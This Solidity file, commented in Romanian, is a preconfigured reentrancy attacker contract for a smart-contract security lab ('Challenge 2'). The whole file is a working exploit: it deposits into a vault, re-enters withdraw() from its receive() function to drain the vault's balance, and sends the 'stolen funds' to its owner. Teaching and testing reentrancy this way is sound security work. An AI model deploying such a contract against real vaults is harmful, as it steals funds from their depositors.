// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VaultAttacker
 * @notice Contract atacator preconfigurat folosit de scripts/run-attack.js in Challenge 2.
 * @dev In fluxul curent de laborator, studentii nu trebuie sa implementeze acest fisier.
 */
interface ISimpleVault {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
    function withdrawAll() external;
    function getBalance() external view returns (uint256);
}

contract VaultAttacker {
    ISimpleVault public vault;
    address public owner;
    uint256 public withdrawAmount;

    // Control al reapelarii pentru a evita out-of-gas.
    uint256 public attackCount;
    uint256 public maxAttacks = 5;

    event AttackStarted(uint256 initialDeposit);
    event AttackCompleted(uint256 stolenAmount);
    event ReentrancyTriggered(uint256 count);

    constructor(address _vaultAddress) {
        require(_vaultAddress != address(0), "Invalid vault address");
        vault = ISimpleVault(_vaultAddress);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }

    /**
     * @notice Pasul 1: depune ETH pentru a trece verificarile de balanta din vault.
     */
    function depositToVault() public payable onlyOwner {
        require(msg.value > 0, "Must send ETH to deposit");
        withdrawAmount = msg.value;

        vault.deposit{value: msg.value}();

        emit AttackStarted(msg.value);
    }

    /**
     * @notice Pasul 2: porneste secventa de retrageri controlate.
     */
    function attack() public onlyOwner {
        require(withdrawAmount > 0, "Must deposit first");

        attackCount = 0;
        vault.withdraw(withdrawAmount);

        emit AttackCompleted(address(this).balance);
    }

    /**
     * @notice Se declanseaza cand vault-ul trimite ETH acestui contract.
     * @dev Reapeleaza vault.withdraw() in functie de conditiile de sold si limita.
     */
    receive() external payable {
        attackCount += 1;
        emit ReentrancyTriggered(attackCount);

        if (address(vault).balance >= withdrawAmount && attackCount < maxAttacks) {
            vault.withdraw(withdrawAmount);
        }
    }

    /**
     * @notice Fallback optional pentru transferuri cu calldata nenul.
     */
    fallback() external payable {}

    /**
     * @notice Transfera ETH-ul obtinut de contract catre owner.
     */
    function extractStolenFunds() public onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds to extract");

        (bool success, ) = owner.call{value: balance}("");
        require(success, "Transfer failed");
    }

    function getBalanceInVault() public view returns (uint256) {
        return vault.getBalance();
    }

    function getStolenAmount() public view returns (uint256) {
        return address(this).balance;
    }

    function setMaxAttacks(uint256 _max) public onlyOwner {
        require(_max > 0, "maxAttacks must be > 0");
        maxAttacks = _max;
    }
}
